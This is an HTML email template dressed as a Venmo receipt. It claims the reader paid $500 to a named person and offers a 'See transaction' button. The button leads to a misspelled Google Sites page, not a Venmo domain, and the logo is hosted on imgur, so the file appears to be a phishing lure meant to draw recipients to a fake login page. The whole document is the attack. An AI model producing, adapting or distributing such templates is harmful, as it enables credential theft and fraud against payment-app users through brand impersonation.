
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Venmo Receipt</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1a1d23 0%, #2d3139 100%);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .email-wrapper {
      width: 100%;
      max-width: 600px;
      background: #1d1f23;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    }

    .container {
      width: 100%;
      background: #1d1f23;
      text-align: center;
      padding: 30px 20px;
    }

    .logo {
      width: 180px;
      max-width: 90%;
      margin: 0 auto 30px auto;
      display: block;
      filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
    }

    .card {
      background: linear-gradient(145deg, #2a2d33 0%, #25272c 100%);
      border-radius: 20px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      padding: 50px 30px;
      box-shadow: 
        0 15px 35px rgba(0, 0, 0, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.05);
      position: relative;
      overflow: hidden;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 2px;
      background: linear-gradient(90deg, 
        transparent, 
        rgba(76, 141, 246, 0.5), 
        transparent
      );
    }

    .profile {
      width: 90px;
      height: 90px;
      border-radius: 50%;
      margin: 0 auto 25px auto;
      display: block;
      border: 3px solid rgba(76, 141, 246, 0.3);
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
      transition: transform 0.3s ease;
    }

    .profile:hover {
      transform: scale(1.05);
    }

    .title {
      font-size: 22px;
      font-weight: 400;
      margin-bottom: 15px;
      color: rgba(255, 255, 255, 0.9);
      letter-spacing: 0.3px;
    }

    .amount {
      font-size: 52px;
      font-weight: 700;
      margin: 20px 0;
      color: #ffffff;
      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
      letter-spacing: -1px;
    }

    .amount sup {
      font-size: 22px;
      vertical-align: super;
      font-weight: 600;
      opacity: 0.9;
    }

    .deposit-label {
      text-align: left;
      width: 100%;
      font-size: 18px;
      font-weight: 500;
      color: rgba(255, 255, 255, 0.7);
      margin-top: 35px;
      margin-bottom: 18px;
      padding-left: 5px;
      letter-spacing: 0.5px;
    }

    .button {
      display: block;
      width: 100%;
      background: linear-gradient(135deg, #5091f5 0%, #4c8df6 100%);
      padding: 20px 0;
      border-radius: 50px;
      text-align: center;
      font-size: 18px;
      font-weight: 600;
      text-decoration: none;
      color: #000000;
      transition: all 0.3s ease;
      box-shadow: 
        0 6px 20px rgba(76, 141, 246, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
      letter-spacing: 0.5px;
    }

    .button:hover {
      background: linear-gradient(135deg, #6ba3f7 0%, #5a9af6 100%);
      box-shadow: 
        0 8px 25px rgba(76, 141, 246, 0.5),
        inset 0 1px 0 rgba(255, 255, 255, 0.4);
      transform: translateY(-2px);
    }

    .button:active {
      transform: translateY(0);
      box-shadow: 
        0 4px 15px rgba(76, 141, 246, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.2);
    }

    .footer {
      padding: 25px 20px;
      text-align: center;
      font-size: 13px;
      color: rgba(255, 255, 255, 0.4);
      border-top: 1px solid rgba(255, 255, 255, 0.05);
    }

    .footer a {
      color: rgba(76, 141, 246, 0.8);
      text-decoration: none;
    }

    /* Responsive Design */
    @media (max-width: 480px) {
      .container {
        padding: 20px 15px;
      }

      .card {
        padding: 40px 20px;
      }

      .logo {
        width: 150px;
      }

      .title {
        font-size: 18px;
      }

      .amount {
        font-size: 42px;
      }

      .button {
        font-size: 16px;
        padding: 18px 0;
      }
    }

    /* Animation */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .card {
      animation: fadeIn 0.6s ease-out;
    }
  </style>
</head>
<body>

  <div class="email-wrapper">
    <div class="container">
      <img 
        class="logo" 
        src="https://i.imgur.com/8TYZ7ea_d.webp?maxwidth=760&fidelity=grand" 
        alt="Venmo Logo"
      >

      <div class="card">
        <img 
          class="profile" 
          src="https://ci3.googleusercontent.com/meips/ADKq_NYbbCLn-DztT57CfA6hepCJmLdcdlaBtA73wWdLWRUWiOsQn2MgiLclq4If6rwRURSUAtlSizp17BZeHwL7F-bt=s0-d-e1-ft" 
          alt="Profile Picture"
        >

        <div class="title">You paid Angelina Guerra</div>

        <div class="amount">
          $500<sup>00</sup>
        </div>

        <div class="deposit-label">Deposit</div>

        <a 
          class="button" 
          href="https://sites.google.com/view/dvemolonlineacconthomepage/home?read_current=1"
        >
          See transaction
        </a>
      </div>
    </div>

    <div class="footer">
      This is an automated message from Venmo.<br>
      Questions? Visit our <a href="#">Help Center</a>
    </div>
  </div>

</body>
</html>
